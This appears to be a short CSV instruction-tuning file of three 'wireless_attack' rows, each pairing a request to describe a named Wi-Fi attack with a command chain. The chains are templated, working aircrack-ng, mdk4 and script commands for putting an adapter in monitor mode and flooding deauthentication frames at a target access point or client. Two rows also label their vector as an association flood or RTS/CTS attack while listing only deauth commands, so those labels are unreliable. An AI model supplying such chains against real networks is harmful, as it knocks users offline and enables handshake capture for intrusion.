"### INSTRUCTION
Describe the 'Client Rotation Attack' attack scenario and its command chain.

### OUTPUT
Scenario: Client Rotation Attack
Vector: association flood
Command Chain:
- airmon-ng start wlan0 {channel}: Start monitor mode on channel
- python3 deauth.py -i wlan0mon -t {bssid} -n {count} -d {delay}: Python deauth script",wireless_attack
"### INSTRUCTION
Describe the 'Channel Sweep Attack' attack scenario and its command chain.

### OUTPUT
Scenario: Channel Sweep Attack
Vector: RTS/CTS attack
Command Chain:
- airmon-ng check kill: Kill interfering processes
- airmon-ng start wlan0: Enable monitor mode
- airodump-ng -c {channel} --bssid {bssid} -w capture wlan0mon: Start capture
- aireplay-ng -0 {count} -a {bssid} -c {client} wlan0mon: Deauth specific client
- aireplay-ng -0 {count} -a {bssid} wlan0mon: Broadcast deauth",wireless_attack
"### INSTRUCTION
Describe the 'Persistent Client Denial' attack scenario and its command chain.

### OUTPUT
Scenario: Persistent Client Denial
Vector: 802.11 deauthentication frames
Command Chain:
- iwconfig wlan0 mode monitor: Set monitor mode
- ifconfig wlan0 up: Bring interface up
- iwconfig wlan0 channel {channel}: Lock to channel
- mdk4 wlan0 d -c {channel} -b {bssid}: MDK4 deauth attack",wireless_attack
